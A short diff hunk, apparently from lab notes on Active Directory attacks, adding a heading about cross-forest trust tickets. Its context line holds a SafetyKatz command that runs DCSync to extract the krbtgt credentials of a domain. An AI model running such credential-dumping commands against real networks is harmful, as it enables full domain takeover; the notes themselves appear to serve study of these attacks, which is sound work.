@@ -763,3 +763,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp
 
 
 
+# **Across Forest using Trust Tickets**
+
+
+
